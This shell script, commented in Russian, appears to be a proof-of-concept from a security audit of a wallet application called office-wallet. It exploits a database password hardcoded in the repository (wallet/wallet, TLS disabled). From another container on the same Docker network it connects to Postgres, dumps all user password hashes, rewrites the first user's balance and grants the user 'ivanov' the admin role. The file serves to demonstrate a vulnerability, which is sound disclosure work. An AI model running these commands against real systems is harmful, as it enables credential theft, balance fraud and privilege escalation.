#!/bin/sh
# 02 — подключение к Postgres по паролю из репозитория.
#
# DSN захардкожен в docker-compose.yml и в дефолте main.go:
#   postgres://wallet:wallet@db:5432/wallet?sslmode=disable
# Порт 5432 на хост не публикуется, но БД доступна любому контейнеру
# в той же docker-сети (или любому, кто оказался на пути трафика:
# sslmode=disable значит поток открытым текстом).
#
# Запуск из корня репозитория:
#   sh poc/02_default_db_creds.sh

set -eu
NET=office-wallet-main_default
PSQL="docker run --rm --network $NET -e PGPASSWORD=wallet postgres:16-alpine psql -h db -U wallet -d wallet -tA"

echo "== подключение по wallet/wallet из чужого контейнера в сети =="
$PSQL -c "SELECT current_user, current_database(), version();"

echo
echo "== дамп паролей =="
$PSQL -c "SELECT id, login, role, password_hash FROM users ORDER BY id;"

echo
echo "== запись: баланс первого юзера =="
$PSQL -c "UPDATE users SET balance_kop=77700000 WHERE id=1 RETURNING id, login, balance_kop;"

echo
echo "== запись: назначение себе роли admin =="
$PSQL -c "UPDATE users SET role='admin' WHERE login='ivanov' RETURNING login, role;"
